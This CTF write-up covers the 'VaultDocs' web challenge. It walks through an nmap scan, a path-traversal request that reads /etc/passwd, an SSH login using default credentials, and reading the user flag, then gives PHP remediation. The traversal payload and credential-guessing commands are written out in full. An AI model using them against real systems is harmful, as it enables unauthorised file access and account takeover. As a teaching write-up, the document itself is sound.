# CTF Writeup: VaultDocs – 1

---

## 1. Challenge Overview

| Field | Details |
| :--- | :--- |
| **Challenge Name** | VaultDocs – 1 |
| **Category** | Web Exploitation / Linux Reconnaissance |
| **Points** | 10 |
| **Target Web URL** | `https://kicyber-e309999b5e2e-vaultdocs-1-0-0.chals.io/` |
| **Target SSH Host** | `0.cloud.chals.io` |
| **Objective** | Obtain initial user access and retrieve the user flag (`user.txt`) |
| **Flag Status** | Solved (Flag Redacted) |

---

## 2. Executive Summary

VaultDocs is an enterprise-themed document management portal. By analyzing the web application, a **Local File Inclusion (LFI) / Path Traversal** vulnerability was identified in the document viewing functionality (`POST /` with parameter `page`). 

Extracting `/etc/passwd` revealed an active non-root user account named `vboxuser`. Enumerating credentials against the exposed SSH service confirmed weak/default credentials (`vboxuser:changeme`). Logging in over SSH provided an interactive foothold on the system, where `~/user.txt` was read to capture the flag.

---

## 3. Step-by-Step Walkthrough

### Phase 1: Reconnaissance & Port Scanning

An initial Nmap scan of the target host identified the web services:

```bash
nmap -Pn -sC -sV --open -p 80,443,8443 kicyber-e309999b5e2e-vaultdocs-1-0-0.chals.io
```

**Key Findings:**
* **Port 80 (HTTP):** OpenResty web server redirecting (301) to HTTPS.
* **Port 443 (HTTPS):** Active web application with SSL/TLS.
* **Network / Protocol Nuance:** The HTTPS endpoint required TLS 1.2 negotiation (`--tlsv1.2 --tls-max 1.2`) and IPv4 resolution (`143.244.222.115`) to prevent handshake reset errors.

Visiting the landing page revealed **VaultDocs v2.4.1**, presenting a document viewer with quick-access forms.

---

### Phase 2: Vulnerability Analysis (Path Traversal / LFI)

Inspecting the HTML form for the document viewer showed that documents were requested via a `POST` request with the parameter `page`:

```html
<form method="POST" action="/" class="doc-form">
  <input type="hidden" name="page" value="docs/readme">
  <button type="submit" class="doc-item">...</button>
</form>
```

Testing for directory traversal by manipulating the `page` parameter:

```bash
curl -4 -sk --tlsv1.2 --tls-max 1.2 \
  -X POST --data-urlencode "page=../../../../etc/passwd" \
  "https://kicyber-e309999b5e2e-vaultdocs-1-0-0.chals.io/"
```

**Response Extract:**
```text
root:x:0:0:root:/root:/bin/bash
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
vboxuser:x:1000:1000:vboxuser:/home/vboxuser:/bin/bash
```

The application reflected system files directly inside `<div class="viewer">`. This confirmed **arbitrary file read**.

Attempting to read `/home/vboxuser/user.txt` directly through the web interface returned an empty view because the web server process (`www-data`) lacked read permissions on the user's home files.

---

### Phase 3: Initial Foothold (SSH Authentication)

From `/etc/passwd`, the user `vboxuser` was identified with a login shell (`/bin/bash`). Checking the external challenge endpoint revealed an SSH service listening on `0.cloud.chals.io`.

Testing common and default credentials for `vboxuser`:

```bash
sshpass -p "changeme" ssh -o StrictHostKeyChecking=no vboxuser@0.cloud.chals.io -p <PORT>
```

**Result:**
Authentication succeeded with password `changeme`.

---

### Phase 4: Flag Retrieval

Once authenticated as `vboxuser`:

```bash
id
# uid=1000(vboxuser) gid=1000(vboxuser) groups=1000(vboxuser),27(sudo)

ls -la ~
cat ~/user.txt
```

**Captured Flag:**
```text
[REDACTED]
```

---

## 4. Root Cause Analysis

1. **Insecure Direct Object Reference / Path Traversal:**
   The backend concatenated user-controlled input (`$page`) directly into the file lookup path without sanitizing directory traversal sequences (`../`) or restricting input against an allowlist of valid documents.
2. **Default / Weak Credentials:**
   The user account `vboxuser` was left with a trivial default password (`changeme`), enabling an immediate pivot from web enumeration to interactive shell access.

---

## 5. Remediation & Hardening

* **Input Validation & Whitelisting:**
  Replace dynamic path concatenation with a strict whitelist of permitted document IDs:
  ```php
  $allowed_docs = [
      'readme' => 'docs/readme.txt',
      'about'  => 'docs/about.txt'
  ];
  if (!array_key_exists($_POST['page'], $allowed_docs)) {
      die("Invalid document selection.");
  }
  ```
* **Path Canonicalization:**
  If file paths must be resolved dynamically, enforce canonicalization and directory boundary checks:
  ```php
  $base_dir = realpath('/var/www/html/docs/');
  $target_path = realpath($base_dir . '/' . basename($_POST['page']));
  if ($target_path === false || strpos($target_path, $base_dir) !== 0) {
      die("Access Denied.");
  }
  ```
* **Credential Hygiene:**
  * Enforce strong password policies and disable default credentials across all local user accounts.
  * Disable password-based SSH authentication in `/etc/ssh/sshd_config` (`PasswordAuthentication no`) in favor of public-key authentication.
